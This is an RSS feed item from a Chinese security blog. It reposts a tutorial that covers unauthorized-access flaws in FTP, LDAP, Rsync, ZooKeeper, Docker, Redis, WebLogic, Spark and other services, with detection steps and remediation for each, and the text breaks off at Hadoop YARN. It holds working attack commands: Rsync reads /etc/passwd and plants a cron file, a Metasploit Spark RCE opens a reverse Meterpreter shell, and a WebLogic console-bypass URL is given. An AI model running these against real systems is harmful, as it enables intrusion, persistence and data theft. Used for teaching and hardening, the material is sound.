<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>总结 - 标签 - bysec</title>
        <link>http://localhost:1313/tags/%E6%80%BB%E7%BB%93/</link>
        <description>总结 - 标签 - bysec</description>
        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>bysec@qq.com (bysec)</managingEditor>
            <webMaster>bysec@qq.com (bysec)</webMaster><lastBuildDate>Sun, 06 Oct 2024 19:59:39 &#43;0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E6%80%BB%E7%BB%93/" rel="self" type="application/rss+xml" /><item>
    <title>常用的30种未授权访问漏洞汇总</title>
    <link>http://localhost:1313/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/</link>
    <pubDate>Sun, 06 Oct 2024 19:59:39 &#43;0800</pubDate><author>
        <name>bysec</name>
    </author><guid>http://localhost:1313/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/</guid>
    <description><![CDATA[<blockquote>
<p><em>转载自： <a href="https://www.freebuf.com/articles/web/338459.html" target="_blank" rel="noopener noreferrer">https://www.freebuf.com/articles/web/338459.html</a></em></p>
</blockquote>
<p><strong>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担</strong></p>
<p>本文导读：</p>
<ul>
<li>尽量覆盖了目前网络资讯上公布的30+种未授权访问漏洞</li>
<li>融入了本人的学习经验和心得，把未授权访问漏洞按照默认端口顺序从小到大排列，对于<strong>默认端口可进行批量端口探测服务，再进一步进行漏洞检测</strong>，逻辑清晰，方便学者学习和漏洞复现。</li>
<li>本文涵盖漏洞描述、漏洞检测和漏洞修复建议为一体，深层次利用不在本文，可自行网上搜索。</li>
</ul>
<h2 id="未授权访问漏洞介绍" class="headerLink">
    <a href="#%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e6%bc%8f%e6%b4%9e%e4%bb%8b%e7%bb%8d" class="header-mark"></a>未授权访问漏洞介绍</h2><p>未授权访问漏洞是一个在企业内部非常常见的问题，未授权访问可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、数据库、网站目录等敏感信息泄露。</p>
<p><strong>演示环境搭建</strong></p>
<p>使用vulhub搭建漏洞演示环境</p>
<p>参考：https://vulhub.org/#/docs/install-docker/</p>
<h2 id="未授权访问漏洞汇总预览" class="headerLink">
    <a href="#%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e6%bc%8f%e6%b4%9e%e6%b1%87%e6%80%bb%e9%a2%84%e8%a7%88" class="header-mark"></a><strong>未授权访问漏洞汇总预览</strong></h2><ol>
<li>
<p>FTP 未授权访问（21）</p>
</li>
<li>
<p>LDAP 未授权访问（389）</p>
</li>
<li>
<p>Rsync 未授权访问（873）</p>
</li>
<li>
<p>ZooKeeper 未授权访问（2181）</p>
</li>
<li>
<p>Docker 未授权访问（2375）</p>
</li>
<li>
<p>Docker Registry未授权（5000）</p>
</li>
<li>
<p>Kibana 未授权访问（5601）</p>
</li>
<li>
<p>VNC 未授权访问（5900、5901）</p>
</li>
<li>
<p>CouchDB 未授权访问（5984）</p>
</li>
<li>
<p>Apache Spark 未授权访问（6066、8081、8082）</p>
</li>
<li>
<p>Redis 未授权访问（6379）</p>
</li>
<li>
<p>Weblogic 未授权访问（7001）</p>
</li>
<li>
<p>HadoopYARN 未授权访问（8088）</p>
</li>
<li>
<p>JBoss 未授权访问（8080）</p>
</li>
<li>
<p>Jenkins 未授权访问（8080）</p>
</li>
<li>
<p>Kubernetes Api Server 未授权（8080、10250）</p>
</li>
<li>
<p>Active MQ 未授权访问（8161）</p>
</li>
<li>
<p>Jupyter Notebook 未授权访问（8888）</p>
</li>
<li>
<p>Elasticsearch 未授权访问（9200、9300）</p>
</li>
<li>
<p>Zabbix 未授权访问（10051）</p>
</li>
<li>
<p>Memcached 未授权访问（11211）</p>
</li>
<li>
<p>RabbitMQ 未授权访问（15672、15692、25672）</p>
</li>
<li>
<p>MongoDB 未授权访问（27017）</p>
</li>
<li>
<p>NFS 未授权访问（2049、20048）</p>
</li>
<li>
<p>Dubbo 未授权访问（28096）</p>
</li>
<li>
<p>Druid 未授权访问</p>
</li>
<li>
<p>Solr 未授权访问</p>
</li>
<li>
<p>SpringBoot Actuator 未授权访问</p>
</li>
<li>
<p>SwaggerUI未授权访问漏洞</p>
</li>
<li>
<p>Harbor未授权添加管理员漏洞</p>
</li>
<li>
<p>Windows ipc共享未授权访问漏洞</p>
</li>
<li>
<p>宝塔phpmyadmin未授权访问</p>
</li>
<li>
<p>WordPress未授权访问漏洞</p>
</li>
<li>
<p>Atlassian Crowd 未授权访问</p>
</li>
<li>
<p>PHP-FPM Fastcgi未授权访问漏洞</p>
</li>
<li>
<p>uWSGI未授权访问漏洞</p>
</li>
<li>
<p>Kong未授权访问漏洞(CVE-2020-11710)</p>
</li>
<li>
<p>ThinkAdminV6未授权访问漏洞</p>
</li>
</ol>
<h2 id="1-ftp-未授权访问21" class="headerLink">
    <a href="#1-ftp-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae21" class="header-mark"></a>1. FTP 未授权访问（21）</h2><p><strong>漏洞简介</strong></p>
<p>FTP 弱口令或匿名登录漏洞，一般指使用 FTP 的用户启用了匿名登录功能，或系统口令的长度太短、复杂度不够、仅包含数字、或仅包含字母等，容易被黑客攻击，发生恶意文件上传或更严重的入侵行为。</p>
<p><strong>漏洞检测</strong></p>
<p>1、端口扫描</p>
<p>2、直接访问ftp路径：ftp://ip:port/</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00002zdfQb1lzgnX.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00002zdfQb1lzgnX.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00002zdfQb1lzgnX.jpg">
        
    </a></p>
<h3 id="漏洞修复" class="headerLink">
    <a href="#%e6%bc%8f%e6%b4%9e%e4%bf%ae%e5%a4%8d" class="header-mark"></a><strong>漏洞修复</strong></h3><ul>
<li>禁止匿名登录；</li>
<li>配置强密码，密码长度建议八位以上，且密码应包括大小写字母、特殊字符、数字混合体；</li>
</ul>
<h2 id="2-ldap-未授权访问389" class="headerLink">
    <a href="#2-ldap-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae389" class="header-mark"></a>2. LDAP 未授权访问（389）</h2><p><strong>漏洞简介</strong></p>
<p>LDAP中文全称为：轻型目录访问协议（Lightweight Directory Access Protocol），默认使用389， LDAP 底层一般使用 TCP 或 UDP 作为传输协议。目录服务是一个特殊的数据库，是一种以树状结构的目录数据库为基础。未对LDAP的访问进行密码验证，导致未授权访问。</p>
<p><strong>漏洞检测</strong></p>
<p>1、端口扫描</p>
<p>2、使用nmap寻找到相关的LDAP服务器，可以使用ldapbrowser工具（下载：https://ldapbrowserwindows.com/）直接连接，获取目录内容。</p>
<p><strong><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000020Clc746fxuq.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000020Clc746fxuq.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000020Clc746fxuq.jpg">
        
    </a></strong></p>
<p><strong>漏洞修复</strong></p>
<ul>
<li>修改ldap的acl，禁止匿名访问。</li>
<li>根据业务设置ldap访问白名单或黑名单；</li>
</ul>
<h2 id="3-rsync-未授权访问873" class="headerLink">
    <a href="#3-rsync-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae873" class="header-mark"></a>3. Rsync 未授权访问（873）</h2><p><strong>漏洞简介</strong></p>
<p>rsync是Linux/Unix下的一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件和目录，默认运行在873端口。由于配置不当，导致任何人可未授权访问rsync，上传本地文件，下载服务器文件。</p>
<p><strong>漏洞检测</strong></p>
<p>1、端口扫描</p>
<p>2、root@kali使用Rsync命令即可进行检测。</p>
<p><code>rsync rsync://192.168.126.130:873/</code></p>
<p><code>rsync rsync://192.168.126.130:873/src</code></p>
<p>利用rsync下载任意文件</p>
<p><code>rsync rsync://192.168.126.130:873/src/</code></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00002O3hrz3kSfcY.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00002O3hrz3kSfcY.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00002O3hrz3kSfcY.jpg">
        
    </a></p>
<p><code>etc/passwd ./</code></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00002kInIN3cjPLD.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00002kInIN3cjPLD.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00002kInIN3cjPLD.jpg">
        
    </a></p>
<p>或者写入任意文件</p>
<p><code>rsync -av shell rsync://192.168.126.130:873/src/etc/cron.d/shell</code></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000039yLW20bYMvW.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000039yLW20bYMvW.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000039yLW20bYMvW.jpg">
        
    </a></p>
<p><strong>漏洞修复</strong></p>
<ul>
<li>隐藏掉 module 信息：修改配置文件 list =false。</li>
<li>权限控制：不需要写入权限的 module 的设置为只读 Read only = true;</li>
<li>网络访问控制：使用安全组策略或白名单限制，只允许必要访问的主机访问;</li>
<li>账户认证：只允许指定的用户利用指定的密码使用 rsync 服务;</li>
<li>数据加密传输：Rsync 默认没有直接支持加密传输，如果需要 Rsync 同步重要性很高的数据，可以使用 ssh;</li>
<li>参考文章：https://www.freebuf.com/column/202771.html</li>
</ul>
<h2 id="4-zookeeper-未授权访问2181" class="headerLink">
    <a href="#4-zookeeper-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae2181" class="header-mark"></a>4. ZooKeeper 未授权访问（2181）</h2><p><strong>漏洞简介</strong></p>
<p>ZooKeeper 是一个分布式的开放源码的分布式应用程序协调服务，ZooKeeper 默认开启在 2181 端口在未进行任何访问控制的情况下攻击者可通过执行 envi 命令获得系统大量的敏感信息包括系统名称Java 环境，任意用户在网络可达的情况下进行为未授权访问并读取数据甚至 kill 服务。</p>
<p><strong>漏洞检测</strong></p>
<ol>
<li>
<p>端口扫描</p>
</li>
<li>
<p>漏洞复现</p>
</li>
</ol>
<p>执行root@kali:~# echo envi|nc 192.168.131.128 2181 获取服务器环境信息：</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00001ZDs2a2lguQ7.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00001ZDs2a2lguQ7.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00001ZDs2a2lguQ7.jpg">
        
    </a></p>
<p>root@kali:~# echo stat |nc 192.168.131.128 2181</p>
<p><strong><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00001XW2mn4g1ca9.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00001XW2mn4g1ca9.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00001XW2mn4g1ca9.jpg">
        
    </a></strong></p>
<p><strong>漏洞修复</strong></p>
<ul>
<li>为ZooKeeper配置相应的访问权限；</li>
<li>设置防火墙策略；</li>
<li>禁止把Zookeeper直接暴露在公网；</li>
</ul>
<h2 id="5-docker-未授权访问2375" class="headerLink">
    <a href="#5-docker-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae2375" class="header-mark"></a>5. Docker 未授权访问（2375）</h2><p><strong>漏洞简介</strong></p>
<p>该未授权访问漏洞是因为Docker API可以执行Docker命令，该接口是目的是取代Docker命令界面，通过URL操作Docker。</p>
<p><strong>漏洞检测</strong></p>
<ul>
<li>端口扫描</li>
<li>直接输入地址 http://your-ip:2375/version。若能访问，证明存在未授权访问漏洞。</li>
</ul>
<p><strong><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00001UG4WR40MKrS.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00001UG4WR40MKrS.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00001UG4WR40MKrS.jpg">
        
    </a></strong></p>
<p><strong>漏洞修复</strong></p>
<ul>
<li>对2375端口做网络访问控制，如ACL控制，或者访问规则；</li>
<li>修改docker swarm的认证方式，使用TLS认证；</li>
</ul>
<h2 id="6-docker-registry未授权5000" class="headerLink">
    <a href="#6-docker-registry%e6%9c%aa%e6%8e%88%e6%9d%835000" class="header-mark"></a>6. Docker Registry未授权（5000）</h2><p>默认5000端口，docker remote api可以执行docker命令，该接口是目的是取代docker 命令界面，通过url操作docker。</p>
<p><strong>漏洞检测</strong>：</p>
<p>1、端口扫描</p>
<p>2、<a href="http://10.101.20.43:5000/v2" target="_blank" rel="noopener noreferrer">http://10.101.20.43:5000/v2</a></p>
<p>http://10.101.20.43:5000/v2/_catalog</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00001qIZz02TOiN6.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00001qIZz02TOiN6.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00001qIZz02TOiN6.jpg">
        
    </a></p>
<p><strong>安全建议</strong></p>
<p>1、设置ACL，只允许信任ip连接对应端口</p>
<p>2、开启TLS，使用生成的证书进行认证</p>
<h2 id="7-kibana-未授权访问5601" class="headerLink">
    <a href="#7-kibana-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae5601" class="header-mark"></a>7. Kibana 未授权访问（5601）</h2><p><strong>漏洞简介</strong></p>
<p>Kibana如果允许外网访问，没有做安全的登录认证，也会被外部随意访问查看所有的数据，造成少数据泄露。</p>
<p><strong>漏洞检测</strong></p>
<ol>
<li>
<p>端口扫描</p>
</li>
<li>
<p>直接访问kibana的页面</p>
</li>
</ol>
<p>http://192.168.126.130:5601/</p>
<p>https://192.168.126.130/app/kibana#</p>
<p>http://192.168.126.130:5601/app/kibana#/</p>
<p>无需账号密码可以登录进入界面</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00004QEtFN3JA5hD.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00004QEtFN3JA5hD.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00004QEtFN3JA5hD.jpg">
        
    </a></p>
<p><strong>漏洞修复</strong></p>
<ul>
<li>设置kibana监听本地地址，并设置ElasticSearch登录的账号和密码；</li>
<li>设置防火墙策略，限定IP访问服务；</li>
</ul>
<h2 id="8-vnc-未授权访问59005901" class="headerLink">
    <a href="#8-vnc-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae59005901" class="header-mark"></a>8. VNC 未授权访问（5900、5901）</h2><p><strong>漏洞简介</strong></p>
<p>VNC 是虚拟网络控制台Virtual Network Console的英文缩写。它是一款优秀的远程控制工具软件由美国电话电报公司AT&amp;T的欧洲研究实验室开发。VNC是基于 UNXI 和 Linux 的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。</p>
<p>VNC 默认端口号为 5900、5901。VNC 未授权访问漏洞如被利用可能造成恶意用户直接控制受控主机危害相当严重。</p>
<p><strong>漏洞检测</strong></p>
<ol>
<li>端口扫描</li>
</ol>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00000qLDAO3TZz1w.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00000qLDAO3TZz1w.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00000qLDAO3TZz1w.jpg">
        
    </a></p>
<ol start="2">
<li>使用 VNC 客户端连接主机</li>
</ol>
<p>VNC-Viewer工具下载(<a href="https://www.realvnc.com/en/connect/download/viewer/windows/" target="_blank" rel="noopener noreferrer">https://www.realvnc.com/en/connect/download/viewer/windows/</a>)</p>
<p>安装过程，双击msi文件一路下一步就可以了。</p>
<p>在 VNC 客户端输入目标服务器IP，之后点击确定、连接，即可成功控制目标服务器</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000033Pn7J4ePkzc.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000033Pn7J4ePkzc.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000033Pn7J4ePkzc.jpg">
        
    </a>
<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00000b5TEz188bVm.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00000b5TEz188bVm.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00000b5TEz188bVm.jpg">
        
    </a>
<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00000BGEKI0btTto.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00000BGEKI0btTto.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00000BGEKI0btTto.jpg">
        
    </a></p>
<p><strong>漏洞修复</strong></p>
<ul>
<li>配置 VNC 客户端登录口令认证并配置符合密码强度要求的密码；</li>
<li>以最小权限的普通用户身份运行操作系统；</li>
</ul>
<h2 id="9-couchdb-未授权访问5984" class="headerLink">
    <a href="#9-couchdb-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae5984" class="header-mark"></a>9. CouchDB 未授权访问（5984）</h2><p><strong>漏洞简介</strong></p>
<p>Apache CouchDB 是一个开源数据库，默认会在5984端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。</p>
<p>在官方配置文档中对HTTP Server的配置有WWW-Authenticate：Set this option to trigger basic-auth popup on unauthorized requests，但是很多用户都没有这么配置，导致漏洞产生。</p>
<p><strong>漏洞检测</strong></p>
<p>1、端口扫描</p>
<p>2、未授权访问kali测试命令</p>
<p>curl 192.168.126.130:5984</p>
<p>curl 192.168.126.130:5984/_config</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00001lb4Dw0ztslv.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00001lb4Dw0ztslv.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00001lb4Dw0ztslv.jpg">
        
    </a></p>
<p><strong>漏洞修复</strong></p>
<p>指定CouchDB绑定的IP （需要重启CouchDB才能生效）在 /etc/couchdb/local.ini 文件中找到 “bind_address = 0.0.0.0” ，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。 注：修改后只有本机才能访问CouchDB。</p>
<p>设置访问密码（需要重启CouchDB才能生效）在 /etc/couchdb/local.ini 中找到<code>“[admins]”</code>字段配置密码。</p>
<p>设置 WWW-Authenticate，强制认证。</p>
<h2 id="10-apache-spark-未授权访问606680818082" class="headerLink">
    <a href="#10-apache-spark-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae606680818082" class="header-mark"></a>10. Apache Spark 未授权访问（6066、8081、8082）</h2><p><strong>漏洞简介</strong></p>
<p>Apache Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动访问控制，攻击者可以在集群中执行任意代码。该漏洞的本质是未授权用户可以向Master节点提交一个应用，Master节点会分发给Slave节点执行应用。如果应用中包含恶意代码，会导致任意代码执行，威胁Spark集群整体的安全性。</p>
<p><strong>漏洞检测</strong></p>
<p>nmap扫描出如下端口开放，则很有可能存在漏洞</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000008zURM1eCnMZ.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000008zURM1eCnMZ.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000008zURM1eCnMZ.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00001xzw1y4KgLkd.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00001xzw1y4KgLkd.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00001xzw1y4KgLkd.jpg">
        
    </a></p>
<p>使用msf工具getshell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf5&gt;use exploit/linux/http/spark<span class="se">\_</span>unauth<span class="se">\_</span>rce
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf5&gt;set payload java/meterpreter/reverse<span class="se">\_</span>tcp
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf5&gt;set rhost 192.168.100.2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf5&gt;set rport <span class="m">6066</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf5&gt;set lhost 192.168.100.1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf5&gt;set lport <span class="m">4444</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf5&gt;set srvhost 192.168.100.1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf5&gt;set srvport <span class="m">8080</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf5&gt;exploit
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000014zSuK4ea3dw.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000014zSuK4ea3dw.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000014zSuK4ea3dw.jpg">
        
    </a></strong></p>
<p><strong>漏洞修复</strong></p>
<ul>
<li>对外关闭敏感端口；</li>
<li>配置用户权限认证；</li>
</ul>
<p>参考文章：https://www.cnblogs.com/KevinGeorge/p/10399844.html</p>
<h2 id="11-redis-未授权访问6379" class="headerLink">
    <a href="#11-redis-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae6379" class="header-mark"></a>11. Redis 未授权访问（6379）</h2><p><strong>漏洞简介</strong></p>
<p>redis是一个数据库，默认端口是6379，redis默认是没有密码验证的，可以免密码登录操作，攻击者可以通过操作redis进一步控制服务器。</p>
<p>Redis未授权访问在4.x/5.0.5以前版本下，可以使用master/slave模式加载远程模块，通过动态链接库的方式执行任意命令。</p>
<p><strong>漏洞检测</strong></p>
<ul>
<li><strong>端口扫描</strong></li>
<li><strong>Kali****连接主机</strong></li>
</ul>
<p>（1）kali安装redis-cli远程连接工具</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">wget http://download.redis.io/redis-stable.tar.gz
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">tar -zxvf redis-stable.tar.gz
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> redis-stable
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">make
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">cp src/redis-cli /usr/bin/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">redis-cli -h
</span></span></code></pre></td></tr></table>
</div>
</div><p>（2）使用redis-cli命令直接远程免密登录redis主机</p>
<p>redis-cli -h 目标主机IP</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000038VlFq0lhJEe.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000038VlFq0lhJEe.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000038VlFq0lhJEe.jpg">
        
    </a></p>
<p>（3）尝试keys * 命令，若存在以下页面，则存在漏洞</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00003LBcKr1zxWVN.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00003LBcKr1zxWVN.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00003LBcKr1zxWVN.jpg">
        
    </a></p>
<p><strong>（4）进一步利用</strong></p>
<p><strong>利用redis 可视化工具Another Redis Desktop Manager</strong></p>
<p><strong><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000025kL154W6rmL.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000025kL154W6rmL.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000025kL154W6rmL.jpg">
        
    </a></strong></p>
<p><strong>漏洞修复</strong></p>
<p>到redis安装目录下，配置redis.conf文件：</p>
<ol>
<li>默认只对本地开放</li>
</ol>
<p><code>bind 127.0.0.1</code></p>
<ol start="2">
<li>添加登陆密码</li>
</ol>
<p>修改 redis.conf 文件，添加</p>
<p><code>requirepass  mypasswd</code></p>
<p>3、在需要对外开放的时候修改默认端口（端口不重复就可以）</p>
<p><code>port 2344</code></p>
<p>4、以低权限运行 Redis 服务（重启redis才能生效）</p>
<p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p>
<p>5、最后还可以配合iptables限制开放</p>
<h2 id="12-weblogic-未授权访问7001" class="headerLink">
    <a href="#12-weblogic-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae7001" class="header-mark"></a>12. Weblogic 未授权访问（7001）</h2><p><strong>漏洞简介</strong></p>
<p>Weblogic是Oracle公司推出的J2EE应用服务器，CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台。</p>
<p>CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。</p>
<p><strong>漏洞检测</strong></p>
<ol>
<li>
<p>端口扫描</p>
</li>
<li>
<p>使用vulhub搭建漏洞演示环境</p>
</li>
</ol>
<p><code>cd vulhub/weblogic/CVE-2020-14882</code></p>
<p><code>sudo docker-compose up –d</code></p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00001p6hK113lOrn.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00001p6hK113lOrn.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00001p6hK113lOrn.jpg">
        
    </a></p>
<p>攻击者可以构造特殊请求的URL，即可未授权访问到管理后台页面：</p>
<p>http://192.168.126.130:7001/console/css/%252e%252e%252fconsole.portal</p>
<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00002g3iR12qYqcR.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00002g3iR12qYqcR.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00002g3iR12qYqcR.jpg">
        
    </a><br>
远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console ，并在 WebLogic Server Console 执行任意代码。</p>
<p><strong>漏洞修复</strong></p>
<ul>
<li>下载补丁程序并安装更新；</li>
</ul>
<h2 id="13-hadoopyarn-未授权访问8088" class="headerLink">
    <a href="#13-hadoopyarn-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae8088" class="header-mark"></a>13. HadoopYARN 未授权访问（8088）</h2><p><strong>漏洞简介</strong></p>
<p>Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的MapReduce算法进行分布式处理，Yarn是Hadoop集群的资源管理系统。</p>
<p>此次事件主要因HadoopYARN资源管理系统配置不当，导致可以未经授权进行访问，从而被攻击者恶意利用。攻击者无需认证即可通过RESTAPI部署任务来执行任意指令，最终完全控制服务器。</p>
<p><strong>漏洞检测</strong></p>
<ol>
<li>
<p>端口扫描</p>
</li>
<li>
<p>使用vulhub搭建漏洞演示环境</p>
</li>
</ol>
<p><code>cd /vulhub/hadoop/unauthorized-yarn</code></p>
<p><code>docker-compose up -d</code></p>
<p>3、环境启动后，没有配置身份认证，可以未授权访问到Hadoop YARN ResourceManager WebUI页面。</p>
<p>http://192.168.126.130:8088/</p>
